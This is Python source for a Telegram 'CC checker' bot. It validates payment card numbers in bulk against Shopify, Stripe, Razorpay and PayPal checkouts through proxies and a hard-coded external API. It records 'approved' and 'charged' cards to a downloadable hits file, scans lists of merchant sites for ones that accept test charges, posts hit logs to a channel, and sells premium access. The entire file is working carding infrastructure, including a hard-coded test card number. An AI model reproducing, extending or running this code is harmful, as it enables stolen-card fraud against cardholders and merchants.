
async def save_approved_card(user_id, user_name, card, status, response, Gate, price):
    try:
        # Format: UserID | Name | CC | Status | Response | Gate | Price
        log_entry = f"{user_id} | {user_name} | {card} | {status} | {response} | {Gate} | {price}\n"
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(log_entry)
    except Exception as e: 
        print(f"Error saving card to {CC_FILE}: {str(e)}")
    # Post a hit summary to the logs channel (Charged/Approved only, never 3DS)
    try:
        asyncio.create_task(send_hit_log(user_id, user_name, status, response, Gate, price))
    except Exception as _e:
        log_error("LOGS", f"Failed to queue hit log: {_e}")

LOG_GATE_EMOJI = {
    "shopify": "🛒",
    "razorpay": "💳",
    "stripe": "🔐",
    "paypal": "💵",
}

def _normalize_gate(gate):
    g = str(gate or "").lower()
    if "shopify" in g: return "shopify", "Sʜᴏᴘɪғʏ"
    if "razor" in g: return "razorpay", "Rᴀᴢᴏʀᴘᴀʏ"
    if "stripe" in g: return "stripe", "Sᴛʀɪᴘᴇ Aᴜᴛʜ"
    if "paypal" in g: return "paypal", "PᴀʏPᴀʟ"
    return "other", (str(gate) if gate else "Unknown")

def _is_3ds_response(response):
    r = str(response or "").upper().replace(" ", "").replace("-", "").replace("_", "")
    return "3DS" in r or "3DSECURE" in r or "3DAUTH" in r

async def _get_plan_label(user_id):
    try:
        premium_users = await load_json(PREMIUM_FILE)
        data = premium_users.get(str(user_id))
        if data:
            expiry = datetime.datetime.fromisoformat(data["expiry"])
            if datetime.datetime.now() <= expiry:
                return resolve_plan_label(data.get("days", 0))
    except Exception:
        pass
    return "Free"

async def _get_username(user_id):
    try:
        reg = await load_json(REGISTRATION_DB)
        data = reg.get(str(user_id)) or {}
        uname = (data.get("username") or "").lstrip("@")
        return uname or None
    except Exception:
        return None

async def send_hit_log(user_id, user_name, status, response, gate, price=None, raise_errors=False):
    """Post a Charged/Approved hit summary to LOGS_CHANNEL_ID.
    Only Charged/Approved are logged; 3DS responses are skipped (Shopify buckets
    3DS_AUTHENTICATION as Approved but it must NOT be logged)."""
    if not LOGS_CHANNEL_ID:
        return
    try:
        status_l = str(status or "").lower()
        is_charged = "charge" in status_l
        is_approved = "approve" in status_l
        if not (is_charged or is_approved):
            return
        if _is_3ds_response(response):
            return
        hit_line = "Cʜᴀʀɢᴇᴅ 💎" if is_charged else "Aᴘᴘʀᴏᴠᴇᴅ ✅"
        gate_key, gate_name = _normalize_gate(gate)
        if gate_key == "shopify":
            price_val = str(price).strip() if price not in (None, "", "-", "0") else ""
            gate_text = f"{gate_name} | {price_val} Usd 🛒" if price_val else f"{gate_name} 🛒"
        else:
            emoji = LOG_GATE_EMOJI.get(gate_key, "💠")
            gate_text = f"{gate_name} {emoji}"
        res_text = str(response or "").upper().strip() or "N/A"
        username = await _get_username(user_id)
        link = f"https://t.me/{username}" if username else f"tg://user?id={user_id}"
        plan_label = await _get_plan_label(user_id)
        safe_name = str(user_name or "Unknown")
        log_msg = (
            f"Hit ➺ {hit_line}\n"
            f"Gᴀᴛᴇ ➺ {gate_text}\n"
            f"Res ➺ {res_text}\n"
            f'Uꜱᴇʀ ➺ <a href="{link}">{safe_name}</a> 👑 ({plan_label})'
        )
        markup = {
            "inline_keyboard": [
                [
                    {
                        "text": "Cʜᴇᴄᴋ Yᴏᴜʀ Cᴀʀᴅs",
                        "url": LOGS_BOT_URL,
                        "icon_custom_emoji_id": CUSTOM_EMOJI["PRIMARY"],
                        "style": "primary"
                    }
                ]
            ]
        }
        keyboard = build_custom_keyboard(markup)
        text = premium_emoji(log_msg) if "<tg-emoji" not in log_msg else log_msg
        await aiogram_bot.send_message(LOGS_CHANNEL_ID, text, reply_markup=keyboard, parse_mode="HTML")
    except Exception as e:
        log_error("LOGS", f"Failed to send hit log: {e}")
        if raise_errors:
            raise

async def parse_cc_log():
    user_hits_data = {}
    id_to_name_map = {}
    entries = []
    global_approved = 0
    global_charged = 0

    if not os.path.exists(CC_FILE):
        return user_hits_data, id_to_name_map, entries, global_approved, global_charged

    async with aiofiles.open(CC_FILE, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()

    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue

        parts = [p.strip() for p in line.split(" | ", 6)]
        if len(parts) < 4:
            continue

        u_id = parts[0]
        u_name = parts[1] or f"user_{u_id}"
        card = parts[2]
        status = parts[3]
        response = parts[4] if len(parts) > 4 else ""
        gate = parts[5] if len(parts) > 5 else ""
        price = parts[6] if len(parts) > 6 else ""
        status_upper = status.upper()

        id_to_name_map[u_id] = u_name
        if u_id not in user_hits_data:
            user_hits_data[u_id] = {"approved": 0, "charged": 0, "total": 0, "cards": []}

        hit_type = "charged" if "CHARGE" in status_upper else "approved"
        user_hits_data[u_id][hit_type] += 1
        user_hits_data[u_id]["total"] += 1
        user_hits_data[u_id]["cards"].append({
            "card": card,
            "status": "Charged" if hit_type == "charged" else "Approved",
            "response": response,
            "gate": gate,
            "price": price,
            "line": line
        })
        entries.append({
            "user_id": u_id,
            "name": u_name,
            "card": card,
            "status": "Charged" if hit_type == "charged" else "Approved",
            "response": response,
            "gate": gate,
            "price": price,
            "line": line
        })

        if hit_type == "charged":
            global_charged += 1
        else:
            global_approved += 1

    return user_hits_data, id_to_name_map, entries, global_approved, global_charged

async def pin_charged_message(event, message):
    try:
        if event.is_group: await message.pin()
    except Exception as e: print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: parsed = urlparse(url)
        except: return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    """Parse proxy in multiple formats with protocol support"""
    import re
    
    proxy = proxy.strip()
    proxy_type = 'http'  # default
    
    # Check if protocol is specified (socks5://, socks4://, http://, https://)
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    # Format: username:password@host:port
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    # Format: host:port@username:password
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    # Format: host:port:username:password (check if 2nd part is valid port)
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        # Validate port number
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    # Format: host:port (no authentication)
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    
    # Validate that we have at least host and port
    if not host or not port:
        return None
    
    # Validate port is numeric and in valid range
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None
    
    # Build proxy URL based on type and authentication
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    
    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    """Test if proxy is working"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)

def is_site_dead(response_text):
    if not response_text: return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad Gate', 'service unavailable',
        'Gate timeout', 'network error', 'connection reset', 
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small','SITE DEAD', 'site dead',
        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors', 'Site errors: Failed to tokenize card', 'Failed',
        'step 1 failed: missing stableid, buildid, or sourcetoken', 'step 1 failed', 'step 0 failed'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

def is_shopify_working(response_text):
    """Strict whitelist: card_declined or order_placed only"""
    if not response_text: return False
    res_lower = response_text.lower()
    working_indicators = ['card_declined', 'captcha_required', '3ds_authentication', '3ds_required', 'order_paid', 'order completed', 'order_placed', 'order placed', 'thank you', 'payment successful', '💎', 'otp_required', 'insufficient_funds', 'incorrect_cvc', 'invalid_cvc', 'incorrect_zip']
    return any(indicator in res_lower for indicator in working_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None, all_sites=None):
    max_retries = MAX_RETRY_ATTEMPTS
    last_response = "Unknown Error"

    for attempt in range(1, max_retries + 1):
        try:
            if not site.startswith('http'):
                site = f'https://{site}'
            
            proxy_data = await get_user_proxy(user_id) if user_id else None
            if not proxy_data:
                last_response = "No Proxy Found"
                log_info("[RETRY]", f"Attempt {attempt}/{max_retries} for Site: {site} - Reason: {last_response}")
                await update_site_retry_metadata(user_id, site, attempt, last_response)
                if attempt < max_retries:
                    new_site = switch_to_fallback_site(all_sites, site)
                    if new_site:
                        log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                        site = new_site
                        await asyncio.sleep(random.uniform(1, 2))
                        continue
                    return site_verify_no_fallback_result(site, attempt, last_response)
                return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": attempt, "last_error": last_response}

            # Format proxy for API
            ip, port, user, pw = proxy_data.get('ip'), proxy_data.get('port'), proxy_data.get('username'), proxy_data.get('password')
            proxy_str = f"{ip}:{port}:{user}:{pw}" if user else f"{ip}:{port}"
            
            api_url = 'http://80.211.141.77:8888/autto'
            params = {'site': site, 'cc': test_card, 'proxy': proxy_str}
            
            timeout = aiohttp.ClientTimeout(total=35)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url, params=params, ssl=SSL_CONTEXT) as res:
                    response_text = await res.text()
                    log_endpoint(str(res.url), "GET", res.status, response_text, card=test_card, site=site)

                    # CHECK FOR PROXY DEAD SIGNAL
                    if res.status in [502, 504, 429]:
                        last_response = f"HTTP {res.status}: {response_text}"
                        log_info("[RETRY]", f"Attempt {attempt}/{max_retries} for Site: {site} - Reason: {normalize_retry_reason(last_response)}")
                        await update_site_retry_metadata(user_id, site, attempt, last_response)
                        if attempt < max_retries:
                            new_site = switch_to_fallback_site(all_sites, site)
                            if new_site:
                                log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                site = new_site
                                await asyncio.sleep(random.uniform(1, 2))
                                continue
                            return site_verify_no_fallback_result(site, attempt, last_response)
                        return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": attempt, "last_error": normalize_retry_reason(last_response)}

                    try:
                        response_json = json.loads(response_text)
                        response_msg = response_json.get("Response", "No Response")
                        price = response_json.get("Price", "-")
                        if is_retryable_card_response(response_msg):
                            last_response = response_msg
                            log_info("[RETRY]", f"Attempt {attempt}/{max_retries} for Site: {site} - Reason: {normalize_retry_reason(last_response)}")
                            await update_site_retry_metadata(user_id, site, attempt, last_response)
                            if attempt < max_retries:
                                new_site = switch_to_fallback_site(all_sites, site)
                                if new_site:
                                    log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                    site = new_site
                                    await asyncio.sleep(random.uniform(1, 2))
                                    continue
                                return site_verify_no_fallback_result(site, attempt, last_response)
                            return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": attempt, "last_error": normalize_retry_reason(last_response)}
                        
                        if is_shopify_working(response_msg): 
                            return {"status": "working", "response": response_msg, "site": site, "price": price, "retries": attempt - 1}
                        else: 
                            return {"status": "dead", "response": response_msg, "site": site, "price": price, "retries": attempt - 1}
                    except:
                        last_response = "Invalid JSON from API"
                        log_info("[RETRY]", f"Attempt {attempt}/{max_retries} for Site: {site} - Reason: {last_response}")
                        await update_site_retry_metadata(user_id, site, attempt, last_response)
                        if attempt < max_retries:
                            new_site = switch_to_fallback_site(all_sites, site)
                            if new_site:
                                log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                                site = new_site
                                await asyncio.sleep(random.uniform(1, 2))
                                continue
                            return site_verify_no_fallback_result(site, attempt, last_response)
                        return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": attempt, "last_error": last_response}

        except Exception as e:
            last_response = str(e)
            log_info("[RETRY]", f"Attempt {attempt}/{max_retries} for Site: {site} - Reason: {normalize_retry_reason(last_response)}")
            await update_site_retry_metadata(user_id, site, attempt, last_response)
            if attempt < max_retries:
                new_site = switch_to_fallback_site(all_sites, site)
                if new_site:
                    log_info("[RETRY]", f"Switching target domain immediately from {site} to {new_site}")
                    site = new_site
                    await asyncio.sleep(random.uniform(1, 2))
                    continue
                return site_verify_no_fallback_result(site, attempt, last_response)
            return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": attempt, "last_error": normalize_retry_reason(last_response)}

    return {"status": "Maxed Out", "response": f"Retry Maxed Out after {max_retries} attempts", "site": site, "price": "-", "retries": max_retries, "last_error": normalize_retry_reason(last_response)}

# This will now work perfectly!
client = TelegramClient('cc_bot', API_ID, API_HASH)
client.parse_mode = 'html'

@client.on(events.NewMessage(incoming=True))
async def global_access_guard(event):
    if not event.raw_text or not event.raw_text.startswith(('/', '.')):
        return
    command = event.raw_text.split()[0].lstrip('/.').lower()
    if command in {"key", "auth", "logs", "getcc", "stats", "up", "maintenance", "release"}:
        if not is_owner(event.sender_id):
            raise StopPropagation
        return
    if MAINTENANCE_MODE and not is_owner(event.sender_id):
        await send_maintenance_notice(event)
        raise StopPropagation
    gate = resolve_gate_name(command)
    if gate in GATE_MAINTENANCE and not is_owner(event.sender_id):
        await send_gate_maintenance_notice(event, gate)
        raise StopPropagation

@client.on(events.NewMessage(pattern=r'(?i)^[/.]maintenance(?:\s+(\w+))?$'))
async def maintenance_handler(event):
    global MAINTENANCE_MODE
    if not is_owner(event.sender_id):
        return
    gate_arg = event.pattern_match.group(1)
    if gate_arg:
        gate = resolve_gate_name(gate_arg)
        if not gate:
            return await event.reply(premium_emoji("⚠️ <b>Usage:</b> <code>/maintenance rz</code> or <code>/maintenance pp</code>"), parse_mode='html')
        GATE_MAINTENANCE.add(gate)
        gate_name = GATE_DISPLAY_NAMES.get(gate, gate.title())
        text = f"⚠️ <b>{gate_name} gate is now under maintenance. Only OWNER can use it.</b>"
        await event.reply(premium_emoji(text), parse_mode='html')
        log_info("SYSTEM", f"{gate_name} gate maintenance enabled by OWNER")
        return
    MAINTENANCE_MODE = True
    await kill_all_batches("maintenance mode enabled")
    text = "<b>System is currently under maintenance. Only the OWNER can access bot functions at this time.</b>"
    await notify_all_users(text)
    await event.reply(premium_emoji(text), parse_mode='html')
    log_info("SYSTEM", "Maintenance mode enabled by OWNER")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]test$'))
async def test_log_handler(event):
    if not is_admin(event.sender_id):
        return
    if not LOGS_CHANNEL_ID:
        return await event.reply(premium_emoji("⚠️ <b>LOGS_CHANNEL_ID is not set.</b> Set it in the config to enable hit logs."), parse_mode='html')
    sender = await event.get_sender()
    name = getattr(sender, "first_name", None) or "Tester"
    try:
        await send_hit_log(event.sender_id, name, "Charged", "ORDER_PLACED", "Shopify", "0-5", raise_errors=True)
        await event.reply(premium_emoji("✅ <b>Test hit log sent</b> to the logs channel. Check it now."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ <b>Failed to send test log:</b> <code>{e}</code>\n\nEnsure the bot is an admin in the logs channel and LOGS_CHANNEL_ID is correct."), parse_mode='html')

@client.on(events.NewMessage(pattern=r'(?i)^[/.]release(?:\s+(\w+))?$'))
async def release_handler(event):
    global MAINTENANCE_MODE
    if not is_owner(event.sender_id):
        return
    gate_arg = event.pattern_match.group(1)
    if gate_arg:
        gate = resolve_gate_name(gate_arg)
        if not gate:
            return await event.reply(premium_emoji("⚠️ <b>Usage:</b> <code>/release rz</code> or <code>/release pp</code>"), parse_mode='html')
        GATE_MAINTENANCE.discard(gate)
        gate_name = GATE_DISPLAY_NAMES.get(gate, gate.title())
        text = f"✅ <b>{gate_name} gate is released and online.</b>"
        await event.reply(premium_emoji(text), parse_mode='html')
        log_info("SYSTEM", f"{gate_name} gate maintenance disabled by OWNER")
        return
    MAINTENANCE_MODE = False
    text = "✅ <b>Bot is online.</b>"
    await notify_all_users(text)
    await event.reply(premium_emoji(text), parse_mode='html')
    log_info("SYSTEM", "Maintenance mode disabled by OWNER")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]kill(?:\s+(\d{4}))?$'))
async def kill_batch_handler(event):
    if not is_admin(event.sender_id):
        return
    batch_id = event.pattern_match.group(1)
    if not batch_id:
        return await event.reply(premium_emoji("⚠️ <b>Usage:</b> <code>/kill 1234</code>"), parse_mode='html')
    killed = await cancel_batch(batch_id, "admin kill command")
    if killed:
        try:
            await event.reply(
                premium_emoji(f"✅ <b>Batch killed.</b>\n\n<b>🎱 Batch ID:</b> <code>{batch_id}</code>"),
                parse_mode='html'
            )
        except Exception:
            await event.reply(f"✅ Batch killed.\n\n🎱 Batch ID: {batch_id}")
    else:
        try:
            await event.reply(
                premium_emoji(f"❌ <b>Batch not found.</b>\n\n<b>🎱 Batch ID:</b> <code>{batch_id}</code>"),
                parse_mode='html'
            )
        except Exception:
            await event.reply(f"❌ Batch not found.\n\n🎱 Batch ID: {batch_id}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]promote(?:\s+(\d+))?$'))
async def promote_admin_handler(event):
    global ADMIN_IDS, ADMIN_ID
    if not is_owner(event.sender_id):
        return
    target_id = event.pattern_match.group(1)
    if not target_id:
        return await event.reply(premium_emoji("⚠️ <b>Usage:</b> <code>/promote 123456789</code>"), parse_mode='html')
    target_id = int(target_id)
    if target_id in ADMIN_IDS:
        return await event.reply(premium_emoji(f"💎 <b>User is already admin.</b>\n\n🆔 <code>{target_id}</code>"), parse_mode='html')
    ADMIN_IDS.append(target_id)
    ADMIN_IDS = sorted(set(ADMIN_IDS))
    ADMIN_ID = ADMIN_IDS
    await save_admin_ids()
    await event.reply(premium_emoji(f"✅ <b>Admin promoted.</b>\n\n🆔 <code>{target_id}</code>"), parse_mode='html')
    log_info("SYSTEM", f"OWNER promoted admin {target_id}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]unpromote(?:\s+(\d+))?$'))
async def unpromote_admin_handler(event):
    global ADMIN_IDS, ADMIN_ID
    if not is_owner(event.sender_id):
        return
    target_id = event.pattern_match.group(1)
    if not target_id:
        return await event.reply(premium_emoji("⚠️ <b>Usage:</b> <code>/unpromote 123456789</code>"), parse_mode='html')
    target_id = int(target_id)
    if target_id == OWNER_ID:
        return await event.reply(premium_emoji("❌ <b>OWNER cannot be unpromoted.</b>"), parse_mode='html')
    if target_id not in ADMIN_IDS:
        return await event.reply(premium_emoji(f"❌ <b>User is not an admin.</b>\n\n🆔 <code>{target_id}</code>"), parse_mode='html')
    ADMIN_IDS = [admin_id for admin_id in ADMIN_IDS if admin_id != target_id]
    ADMIN_ID = ADMIN_IDS
    await save_admin_ids()
    await event.reply(premium_emoji(f"✅ <b>Admin removed.</b>\n\n🆔 <code>{target_id}</code>"), parse_mode='html')
    log_info("SYSTEM", f"OWNER unpromoted admin {target_id}")

async def run_site_verification(event, owner_id, selected_range):
    sites = TEMP_EXTRACTED.get(owner_id)
    if not sites: return
    
    USER_PROCESS_STATUS[owner_id] = "running"
    PENDING_SUBTASKS[owner_id] = []
    
    working_data, wrong_price_list, dead_list = [], [], []
    checked_count = 0
    total_sites = len(sites)
    batch_id = USER_BATCHES.get(owner_id, "N/A")
    semaphore = asyncio.Semaphore(50)

    async def fast_site_check(site_url):
        async with semaphore:
            # CHECK 1: Before starting request
            if USER_PROCESS_STATUS.get(owner_id) == "stopped": return None
            res = await test_single_site(site_url, user_id=owner_id, all_sites=sites)
            # CHECK 2: After request finishes
            if USER_PROCESS_STATUS.get(owner_id) == "stopped": return None
            return res

    try:
        tasks = [asyncio.create_task(fast_site_check(s)) for s in sites]
        PENDING_SUBTASKS[owner_id] = tasks 
        
        pending_tasks = set(tasks)
        while pending_tasks:
            if USER_PROCESS_STATUS.get(owner_id) == "stopped":
                for task in pending_tasks:
                    task.cancel()
                await asyncio.gather(*pending_tasks, return_exceptions=True)
                break

            done, pending_tasks = await asyncio.wait(pending_tasks, return_when=asyncio.FIRST_COMPLETED)

            for completed_task in done:
                try:
                    res = completed_task.result()
                except asyncio.CancelledError:
                    continue
                
                if res is None: continue
            
                checked_count += 1
                site_url, site_price = res.get('site', 'Unknown'), res.get('price', '-')

                if res['status'] == 'working':
                    if is_price_matching(site_price, selected_range):
                        working_data.append({"url": site_url, "price": site_price})
                    else:
                        wrong_price_list.append(f"{site_url} | Price: {site_price}")
                else:
                    dead_reason = "Retry Maxed Out" if res.get('status') == "Maxed Out" else res.get('response', 'Dead')
                    dead_list.append(f"{site_url} | {dead_reason}")

                # UI Update with WRONG PRICE added back
                if checked_count % 5 == 0 or checked_count == total_sites:
                    bar = get_progress_bar(checked_count, total_sites)
                    msg = premium_emoji(f"💠 <b>Turbo-Checking...</b>\n<code>{bar}</code>\n\n"
                           f"🎱 Batch ID: <code>{batch_id}</code>\n"
                           f"✅ Added: <code>{len(working_data)}</code> \n"
                           f"💰 Wrong Price: <code>{len(wrong_price_list)}</code> \n"
                           f"❌ Dead: <code>{len(dead_list)}</code> \n"
                           f"📊 Scanned: <code>{checked_count}/{total_sites}</code>")
                    try: 
                        # Note: Custom emojis require parse_mode='html'
                        await event.edit(msg, buttons=[[Button.inline("🛑 STOP ENGINE", f"stopproc:{owner_id}")]], parse_mode='html')
                    except: pass

    except Exception as e:
        logger.error(f"Engine Error: {e}")
    finally:
        # Final cleanup and Report generation
        if checked_count > 0:
            if working_data:
                db = await load_json(SITE_FILE)
                u_list = db.get(str(owner_id), [])
                existing = {site_dedupe_key(s) for s in u_list}
                for s in working_data:
                    key = site_dedupe_key(s['url'])
                    if key and key not in existing:
                        u_list.append({"url": s['url'], "price": s['price'], "range": selected_range})
                        existing.add(key)
                db[str(owner_id)] = dedupe_sites(u_list)
                await save_json(SITE_FILE, db)

            report_stream = io.BytesIO()
            content = f"📊 SHOPIFY TURBO-REPORT\nStatus: {'COMPLETED' if checked_count == total_sites else 'FORCE STOPPED'}\n"
            content += f"Range: ${selected_range} | Scanned: {checked_count}/{total_sites}\n\n"
            content += f"? ADDED ({len(working_data)}):\n" + "\n".join([f"{s['url']} | {s['price']}" for s in working_data])
            content += f"\n\n💰 WRONG PRICE ({len(wrong_price_list)}):\n" + "\n".join(wrong_price_list)
            content += f"\n\n❌ DEAD ({len(dead_list)}):\n" + "\n".join(dead_list)
            
            report_stream.write(content.encode('utf-8'))
            report_stream.seek(0)
            report_stream.name = "Turbo_Report.txt"

            status_text = "✅ <b>Finished!</b>" if checked_count == total_sites else "🛑 <b>Engine Killed!</b>"
            summary = premium_emoji(f"{status_text}\n\n"
                       f"🎱 Batch ID: <code>{batch_id}</code>\n"
                       f"✅ Added: <code>{len(working_data)}</code> \n"
                       f"💰 Wrong Price: <code>{len(wrong_price_list)}</code> \n"
                       f"📊 Total Scanned: <code>{checked_count}/{total_sites}</code>")
            
            await event.respond(summary, file=report_stream)

        # COMPLETE PURGE OF STATE
        USER_PROCESS_STATUS.pop(owner_id, None)
        RUNNING_TASKS.pop(owner_id, None)
        PENDING_SUBTASKS.pop(owner_id, None)
        TEMP_EXTRACTED.pop(owner_id, None)

# --- THE SINGLE ADVANCED SITE ADDING SYSTEM ---
# Telethon /start handler disabled - aiogram now handles /start for UI
# @client.on(events.NewMessage(pattern=r'(?i)^[/.]start$'))
# async def start_handler(event):
#     user_id = event.sender_id
#     
#     # 1. Check if user is banned
#     if await is_banned_user(user_id):
#         return await event.reply(banned_user_message())
#
#     # 2. LOG USER (Auto-saves all users for your broadcast list)
#     try:
#         free_users = await load_json(FREE_FILE)
#         premium_users = await load_json(PREMIUM_FILE)
#         if str(user_id) not in free_users and str(user_id) not in premium_users:
#             sender = await event.get_sender()
#             username = sender.username if sender and sender.username else "N/A"
#             free_users[str(user_id)] = {
#                 'registered_at': datetime.datetime.now().isoformat(),
#                 'username': username
#             }
#             await save_json(FREE_FILE, free_users)
#     except Exception as e:
#         print(f"Error logging user: {e}")
#
#     # 3. Build Menu Text
#     user_is_admin = is_admin(user_id)
#     user_is_owner = is_owner(user_id)
#     
#     menu_text = premium_emoji("🚀 <b>Welcome to Shopify CC Checker Bot</b>\n")
#     menu_text += "━━━━━━━━━━━━━━━━━━\n\n"
#     
#     menu_text += premium_emoji("💳 <b>CHECKER COMMANDS</b>\n")
#     menu_text += "• <code>/sh</code> | <code>/msh</code> - Check CC (Single/Mass)\n"
#     menu_text += "• <code>/rz</code> | <code>/mrz</code> - Razorpay Check (Single/Mass)\n"
#     menu_text += "• <code>/pp</code> | <code>/mpp</code> - PayPal Check (Single/Mass)\n"
#     menu_text += "• <code>/chk</code> | <code>/mchk</code> - Stripe Auth Check (Single/Mass)\n"
#     menu_text += "• <code>/mtxt</code> | <code>/ran</code> - File/Admin-Site Checks\n\n"
#     
#     menu_text += premium_emoji("🌐 <b>SITE & PROXY</b>\n")
#     menu_text += "• <code>/add</code> - Add Sites with Price Filtering\n"
#     menu_text += "• <code>/rm</code> - Remove Site (Use <code>/rm all</code> to clear)\n"
#     menu_text += "• <code>/check</code> - Verify Working Sites\n"
#     menu_text += "• <code>/addpxy</code> | <code>/proxy</code> | <code>/rmpxy</code>\n"
#     menu_text += "• <code>/ps</code> | <code>/rps</code> | <code>/aps</code> - PayPal Site Tools\n\n"
#     
#     menu_text += premium_emoji("🛠 <b>TOOLS</b>\n")
#     menu_text += "• <code>/px</code> - Proxy Checker TXT/List\n"
#     menu_text += "• <code>/fl</code> - <b>Fast Card Fetcher & Parser</b>\n\n"
#     
#     menu_text += premium_emoji("💎 <b>USER ACCOUNT</b>\n")
#     menu_text += "• <code>/info</code> - Check Profile & Total Hits\n"
#     menu_text += "• <code>/redeem</code> - Activate Premium Key\n\n"
#
#     # 4. ADMIN PANEL (Admins and Owner)
#     if user_is_admin:
#         menu_text += premium_emoji("⚙️ <b>ADMIN PANEL</b>\n")
#         menu_text += "• <code>/active</code> - <b>Monitor Live Sessions</b>\n"
#         menu_text += "• <code>/bc [msg]</code> - Broadcast Message\n"
#         menu_text += "• <code>/msg [id] [msg]</code> - Direct Message\n"
#         menu_text += "• <code>/kill [batch_id]</code> - Kill Batch\n"
#         menu_text += "• <code>/reboot</code> - System Restart\n"
#         menu_text += "• <code>/ban</code> | <code>/unban</code> | <code>/unauth</code>\n\n"
#
#     # 5. OWNER PANEL (Owner only)
#     if user_is_owner:
#         menu_text += premium_emoji("🔥 <b>OWNER PANEL</b>\n")
#         menu_text += "• <code>/stats</code> - Hits Scraper & Stats\n"
#         menu_text += "• <code>/getcc</code> - Download Hits (cc.txt)\n"
#         menu_text += "• <code>/logs</code> - Export Activity Logs\n"
#         menu_text += "• <code>/up</code> - Update Bot (Auto-Backup)\n"
#         menu_text += "• <code>/maintenance</code> | <code>/release</code>\n"
#         menu_text += "• <code>/promote</code> | <code>/unpromote</code>\n"
#         menu_text += "• <code>/auth</code> | <code>/key</code> | <code>/ban</code> | <code>/unban</code>\n\n"
#
#     menu_text += "━━━━━━━━━━━━━━━━━━\n"
#     menu_text += premium_emoji("📝 <i>Tip: Reply to any text or file with /fl to extract cards!</i>")
#
#     # 6. Buttons
#     buttons = [
#         [
#             Button.url("💎 Official Channel", "https://t.me/+7NYbDK1L__U5OGZk"),
#             Button.url("🚀 Developer", "https://t.me/IQ_Builder")
#         ]
#     ]
#     # The premium_emoji function ONLY works on the menu_text (the message body)
#     await event.reply(premium_emoji(menu_text), buttons=buttons, parse_mode='html')

